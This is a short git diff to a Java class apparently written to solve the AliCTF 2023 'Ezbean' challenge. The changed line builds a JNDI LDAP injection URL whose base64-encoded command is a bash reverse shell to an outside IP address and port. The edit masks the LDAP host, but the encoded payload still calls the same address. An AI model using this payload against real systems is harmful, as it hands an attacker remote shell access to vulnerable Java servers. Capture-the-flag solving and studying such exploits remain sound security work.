@@ -90,7 +90,7 @@ public class AliCTF2023Ezbean {
     }
 
     public static void main(String[] args) throws Exception {
-        String jndi = "ldap://8.142.104.78:1389/TomcatBypass/Command/Base64/YmFzaCAtaSA%2BJiAvZGV2L3RjcC84LjE0Mi4xMDQuNzgvOTAwMSAwPiYx";
+        String jndi = "ldap:/ip/TomcatBypass/Command/Base64/YmFzaCAtaSA%2BJiAvZGV2L3RjcC84LjE0Mi4xMDQuNzgvOTAwMSAwPiYx";
 //        case1(jndi);
         case2();
 //        case3(jndi);
